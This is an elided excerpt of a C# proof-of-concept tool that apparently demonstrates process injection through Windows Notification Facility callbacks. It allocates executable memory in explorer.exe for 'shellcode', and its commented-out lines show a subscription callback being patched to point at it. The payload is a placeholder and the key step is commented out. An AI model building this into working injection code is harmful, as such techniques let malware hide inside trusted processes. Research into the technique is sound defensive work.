...
namespace WNFuck
{
    internal class WNFuckInjection
    {
        ...
        static void Main(string[] args)
        {
            ...
            WELL_KNOWN_WNF_NAME stateName = (WELL_KNOWN_WNF_NAME)WELL_KNOWN_WNF_NAME.WNF_SHEL_CHAT_ICON_BADGE;
            Console.WriteLine($"[+] WNF Client started. Press any key to send a {stateName} notification.");

            string data = new string('a', 256);
            byte[] bData = Encoding.ASCII.GetBytes(data);

            var proc = PeUtils.GetProcessByName("EXPLORER");
            IntPtr pShellcode = NativeAPI.VirtualAllocEx(proc.Handle, IntPtr.Zero, (uint)bData.Length, MemoryAllocationFlags.MEM_COMMIT | MemoryAllocationFlags.MEM_RESERVE, MemoryProtectionFlags.PAGE_EXECUTE_READ);

            Console.WriteLine($"[+] Shellcode @ {pShellcode.ToString("X16")}");
            NativeAPI.VirtualFreeEx(proc.Handle, pShellcode, 0, MemoryAllocationFlags.MEM_RELEASE);
        ...
        //            IntPtr resultCallback = PeUtils.PatchUserSubscriptionCallback(peProc, userSub.Key, pShellcode);
        ...
        //            IntPtr resultCallback = PeUtils.PatchUserSubscriptionCallback(peProc, userSub.Key, userSub.Value.Callback);
